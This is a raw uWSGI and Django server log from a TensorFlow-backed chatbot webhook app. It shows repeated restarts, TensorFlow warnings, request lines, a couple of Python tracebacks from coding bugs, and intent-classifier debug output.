2020-09-03 06:42:37.825402: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 06:42:37.826809: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 06:42:37.828190: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 11505|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 542 bytes} [Thu Sep  3 06:42:28 2020] POST /webhook/ => generated 177 bytes in 9451 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11505|app: 0|req: 2/2] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 06:42:39 2020] POST /webhook/ => generated 177 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11505|app: 0|req: 3/3] 66.102.6.203 () {42 vars in 542 bytes} [Thu Sep  3 06:42:42 2020] POST /webhook/ => generated 177 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11505|app: 0|req: 4/4] 66.249.83.41 () {42 vars in 542 bytes} [Thu Sep  3 06:42:59 2020] POST /webhook/ => generated 177 bytes in 9 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11505|app: 0|req: 5/5] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 06:43:16 2020] POST /webhook/ => generated 177 bytes in 101 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11505|app: 0|req: 6/6] 66.249.84.207 () {42 vars in 543 bytes} [Thu Sep  3 06:43:36 2020] POST /webhook/ => generated 177 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11505|app: 0|req: 7/7] 66.102.6.201 () {42 vars in 542 bytes} [Thu Sep  3 06:44:41 2020] POST /webhook/ => generated 177 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11505|app: 0|req: 8/8] 203.249.39.174 () {54 vars in 935 bytes} [Thu Sep  3 06:45:11 2020] GET /chat/ => generated 71 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Sep  3 07:02:08 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55d2af8d9d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55d2af8d9d00 pid: 11593 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11593, cores: 1)
2020-09-03 07:02:44.175159: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-03 07:02:44.175194: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-03 07:02:52.516185: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-03 07:02:52.516215: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-03 07:02:52.516230: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-03 07:02:52.516442: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-03 07:02:52.539927: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-03 07:02:52.540289: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55d2b47cc8d0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-03 07:02:52.540305: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-03 07:02:52.829575: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 07:02:52.831014: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 07:02:52.832408: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 11593|app: 0|req: 1/1] 203.249.39.174 () {54 vars in 934 bytes} [Thu Sep  3 07:02:43 2020] GET /chat/ => generated 1476 bytes in 9430 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 11593|app: 0|req: 2/2] 66.102.6.203 () {42 vars in 542 bytes} [Thu Sep  3 07:03:02 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11593|app: 0|req: 3/3] 66.102.6.203 () {42 vars in 542 bytes} [Thu Sep  3 07:03:02 2020] POST /webhook/ => generated 71 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 11593|app: 0|req: 4/4] 66.249.84.207 () {42 vars in 543 bytes} [Thu Sep  3 07:08:22 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11593|app: 0|req: 5/5] 66.249.84.209 () {42 vars in 543 bytes} [Thu Sep  3 07:08:22 2020] POST /webhook/ => generated 71 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 11593|app: 0|req: 6/6] 128.14.134.170 () {36 vars in 501 bytes} [Thu Sep  3 07:09:20 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Sep  3 07:21:05 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x557d9ef07d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x557d9ef07d00 pid: 11679 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11679, cores: 1)
2020-09-03 07:21:33.600465: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-03 07:21:33.600502: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-03 07:21:41.940569: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-03 07:21:41.940602: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-03 07:21:41.940617: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-03 07:21:41.940835: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-03 07:21:41.963936: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-03 07:21:41.964311: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x557da3dfae70 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-03 07:21:41.964329: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-03 07:21:42.255978: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 07:21:42.257434: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 07:21:42.258818: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 11679|app: 0|req: 1/1] 203.249.39.174 () {54 vars in 935 bytes} [Thu Sep  3 07:21:33 2020] GET /chat/ => generated 1476 bytes in 9433 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 11679|app: 0|req: 2/2] 66.249.84.207 () {42 vars in 543 bytes} [Thu Sep  3 07:22:06 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 46, in webhook
    return chatting(queryText)
  File "./haniumapp/views.py", line 75, in chatting
    if(queryText != null):
NameError: name 'null' is not defined
[pid: 11679|app: 0|req: 3/3] 66.249.84.209 () {42 vars in 543 bytes} [Thu Sep  3 07:22:06 2020] POST /webhook/ => generated 67859 bytes in 48 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Sep  3 07:23:18 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55fe44123d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55fe44123d00 pid: 11750 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11750, cores: 1)
2020-09-03 07:23:50.247283: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-03 07:23:50.247318: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-03 07:23:58.668666: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-03 07:23:58.668706: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-03 07:23:58.668726: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-03 07:23:58.668935: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-03 07:23:58.691950: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-03 07:23:58.692315: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55fe49016b80 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-03 07:23:58.692331: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-03 07:23:58.982102: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 07:23:58.983531: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 07:23:58.984920: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 11750|app: 0|req: 1/1] 203.249.39.174 () {54 vars in 935 bytes} [Thu Sep  3 07:23:49 2020] GET /chat/ => generated 1476 bytes in 9512 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 11750|app: 0|req: 2/2] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 07:25:26 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 126, in _get_response
    "returned None instead." % (callback.__module__, view_name)
ValueError: The view haniumapp.views.webhook didn't return an HttpResponse object. It returned None instead.
[pid: 11750|app: 0|req: 3/3] 66.249.83.45 () {42 vars in 542 bytes} [Thu Sep  3 07:25:27 2020] POST /webhook/ => generated 49747 bytes in 40 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
[pid: 11750|app: 0|req: 4/4] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 07:25:56 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 126, in _get_response
    "returned None instead." % (callback.__module__, view_name)
ValueError: The view haniumapp.views.webhook didn't return an HttpResponse object. It returned None instead.
[pid: 11750|app: 0|req: 5/5] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 07:25:56 2020] POST /webhook/ => generated 49747 bytes in 38 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Sep  3 07:26:57 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x560ad39ead00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x560ad39ead00 pid: 11824 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11824, cores: 1)
2020-09-03 07:27:05.134932: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-03 07:27:05.134968: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-03 07:27:13.495582: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-03 07:27:13.495614: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-03 07:27:13.495630: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-03 07:27:13.495869: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-03 07:27:13.519963: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-03 07:27:13.520331: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x560ad88de100 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-03 07:27:13.520350: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-03 07:27:13.807675: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 07:27:13.809108: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 07:27:13.810500: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 11824|app: 0|req: 1/1] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 07:27:04 2020] POST /webhook/ => generated 181 bytes in 9438 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11824|app: 0|req: 2/2] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 07:27:16 2020] POST /webhook/ => generated 181 bytes in 8 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
2020-09-03 07:27:17.923689: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-09-03 07:27:18.230485: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 07:27:18.231994: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 07:27:18.233414: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
52.39%   .

[pid: 11824|app: 0|req: 3/3] 66.249.83.41 () {42 vars in 542 bytes} [Thu Sep  3 07:27:17 2020] POST /webhook/ => generated 104 bytes in 1173 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 11824|app: 0|req: 4/4] 66.249.83.45 () {42 vars in 542 bytes} [Thu Sep  3 07:27:19 2020] POST /webhook/ => generated 104 bytes in 43 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11824|app: 0|req: 5/5] 203.249.39.174 () {54 vars in 935 bytes} [Thu Sep  3 07:27:21 2020] GET /chat/ => generated 1476 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 11824|app: 0|req: 6/6] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 07:30:53 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 11824|app: 0|req: 7/7] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 07:30:53 2020] POST /webhook/ => generated 104 bytes in 44 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 11824|app: 0|req: 8/8] 66.249.83.45 () {42 vars in 542 bytes} [Thu Sep  3 07:30:54 2020] POST /webhook/ => generated 104 bytes in 42 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 11824|app: 0|req: 9/9] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 07:31:33 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 11824|app: 0|req: 10/10] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 07:31:34 2020] POST /webhook/ => generated 104 bytes in 42 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 11824|app: 0|req: 11/11] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 07:31:34 2020] POST /webhook/ => generated 104 bytes in 41 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Sep  4 06:10:22 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1034-aws #36-Ubuntu SMP Tue Aug 18 08:58:43 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
